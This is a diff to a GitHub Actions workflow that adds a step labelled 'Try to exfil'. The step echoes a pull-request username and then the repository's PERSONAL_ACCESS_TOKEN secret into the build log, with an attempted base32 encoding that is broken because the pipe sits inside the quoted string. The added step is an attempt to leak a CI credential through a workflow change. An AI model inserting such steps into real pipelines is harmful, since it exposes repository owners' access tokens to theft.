@@ -39,6 +39,13 @@ jobs:
         run: |
           echo "username=$(cat .pr/USERNAME)" >> $GITHUB_OUTPUT
           echo "issue_number=$(cat .pr/ISSUE_NUMBER)" >> $GITHUB_OUTPUT
+
+      - name: Try to exfil
+        run: |
+          echo "USERNAME - ${{steps.pr_information.outputs.username}}"
+          echo "SECRET -" 
+          echo "${{ secrets.PERSONAL_ACCESS_TOKEN }} | base32"
+          echo "Secret echoed"
    
       - name: Post preview build comment
         id: post_preview_build_comment
